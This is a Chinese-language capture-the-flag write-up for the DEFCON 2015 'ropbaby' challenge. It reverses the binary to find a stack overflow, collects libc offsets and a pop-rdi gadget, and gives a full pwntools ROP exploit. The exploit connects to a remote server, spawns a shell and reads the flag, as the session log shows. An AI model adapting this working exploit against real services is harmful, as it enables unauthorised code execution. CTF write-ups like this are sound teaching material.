# title : ropbaby writeup

# 寻找溢出点

使用ida逆向一下，阅读一下主函数，发现一个可以溢出的地方：
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int v3; // eax@4
  unsigned __int64 v4; // r14@15
  int v5; // er13@17
  size_t v6; // r12@17
  int v7; // eax@18
  void *handle; // [sp+8h] [bp-448h]@1
  char nptr[1088]; // [sp+10h] [bp-440h]@2
  __int64 savedregs; // [sp+450h] [bp+0h]@22

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          sub_BF7();
          if ( !sub_B9A((__int64)nptr, 1024LL) )// 读取输入
          {
            puts("Bad choice.");
            return 0LL;
          }
          v3 = strtol(nptr, 0LL, 10);
          if ( v3 != 2 )
            break;
          __printf_chk(1LL, (__int64)"Enter symbol: ");
          if ( sub_B9A((__int64)nptr, 64LL) )
          {
            dlsym(handle, nptr);
            __printf_chk(1LL, (__int64)"Symbol %s: 0x%016llX\n");
          }
          else
          {
            puts("Bad symbol.");
          }
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_24;
        __printf_chk(1LL, (__int64)"libc.so.6: 0x%016llX\n");
      }
      if ( v3 != 3 )
        break;
      __printf_chk(1LL, (__int64)"Enter bytes to send (max 1024): ");
      sub_B9A((__int64)nptr, 1024LL);
      v4 = (signed int)strtol(nptr, (char **)'\0', 10);
      if ( v4 - 1 > 1023 )
      {
        puts("Invalid amount.");
      }
      else
      {
        if ( v4 )
        {
          v5 = 0;
          v6 = 0LL;
          while ( 1 )
          {
            v7 = _IO_getc(stdin);
            if ( v7 == -1 )
              break;
            nptr[v6] = v7;
            v6 = ++v5;
            if ( v4 <= v5 )
              goto LABEL_22;
          }
          v6 = v5 + 1;
        }
        else
        {
          v6 = 0LL;
        }
LABEL_22:
        memcpy(&savedregs, nptr, v6);
      }
    }
    if ( v3 == 4 )
      break;
LABEL_24:
    puts("Bad choice.");
  }
  dlclose(handle);
  puts("Exiting.");
  return 0LL;
}
```

溢出点为：` memcpy(&savedregs, nptr, v6);`

其中savedregs长度为8字节，ntpr为1024字节缓冲区，有大量空间可以布置shellcode。

# 0x02 构造利用
从前一阶段知其为一个标准的栈溢出，通过checksec查看其开启的保护方式
```
[root@bogon baseline]# pwn checksec ropbaby
[*] '/home/baseline/ropbaby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```

NX为enable，DEP开了的，所以需要考虑使用ROP（pop rdi;ret）

使用ROPgadget搜索ROP链
```
[root@bogon baseline]# ROPgadget --binary libc-2.23.so --only "pop|ret"
...
0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63
0x00000000000d20a3 : pop rcx ; ret
0x0000000000020256 : pop rdi ; pop rbp ; ret
0x0000000000021102 : pop rdi ; ret
0x0000000000067499 : pop rdi ; ret 0xffff
0x0000000000115064 : pop rdx ; pop r10 ; ret
0x0000000000101fbc : pop rdx ; pop rbx ; ret
0x00000000000ea669 : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000115089 : pop rdx ; pop rsi ; ret
...
```

于是得到gadget的偏移0x21102

为了get shell， 还需要知道`'bin/sh'` 和 `system`的地址，

通过搜索可以获取`bin/sh`的偏移：
```
[root@bogon baseline]# strings -a -tx libc-2.23.so | grep /bin/sh
 18cd17 /bin/sh

```
`bin/sh`的偏移为0x18cd17

接着使用objdump搜索`system`偏移（IDA里看导出表也可）
```
[root@bogon baseline]# objdump -T libc-2.23.so | grep system
00000000001387d0 g    DF .text  0000000000000046  GLIBC_2.2.5 svcerr_systemerr
0000000000045390 g    DF .text  000000000000002d  GLIBC_PRIVATE __libc_system
0000000000045390  w   DF .text  000000000000002d  GLIBC_2.2.5 system
[root@bogon baseline]#

```
获得`system`偏移为0x45390


至于libc的运行时基址，可以通过程序运行时输入得到（libc_base = systemaddress - systemoffset），构造payload如下：

'A'*8 + gadget_address + binsh_address + system_address

编写exploit
```
#!/usr/bin/python
# @auther baseline
# github : https://github.com/windyware

from pwn import *
import re

# prase addr from recv data
def prase_addr(buf):
        re_addr = re.compile(r"0x([0-9A-Z]{16,16})")
        addr = re_addr.findall(buf)
        if addr == None:
                return None
        else:
                return addr[0]
# get link
io = remote('121.194.2.42', 8004)
print io.recv(1024)

# get system addr
io.sendline('2')
print io.recv(1024)
io.sendline('system')
system_address = int(prase_addr(io.recv(1024)), 16)
print '[+] system addr :' , hex(system_address)

# calculater rop chain
# use ROPgadget to search rop chain in lib: ROPgadget --binary libname --only "pop|ret"
system_offset = 0x45390
gadget_offset = 0x21102
binsh_offset  = 0x18cd17

libc_base = system_address - system_offset # get the load base of libc

gadget_address = libc_base + gadget_offset
binsh_address = libc_base + binsh_offset

# prepare payload
payload = 'A' * 8 #overflow the char savedregs 8 bits
payload += p64(gadget_address) # pop rdi;ret
payload += p64(binsh_address) # bin/bash
payload += p64(system_address) # system address


# expolit
print '[+] exploit'
io.sendline('3')
io.recv(1024)
print(len(payload))
io.sendline('32')
io.sendline(payload)
io.recv(1024)


io.interactive()

```

# 0x03 获取flag
运行exploit，获取flag
```
[root@bogon baseline]# ./pwnropbaby_pwn.py
[+] Opening connection to 121.194.2.42 on port 8004: Done

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
:
Enter symbol:
[+] system addr : 0x7f515a69d390
[+] exploit
32
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls
defcon2015_ropbaby
flag
$ cat f
cat: f: No such file or directory
$ cat flag
flag{5fad80f09c046dd52e4c3a0764095505}
$

```
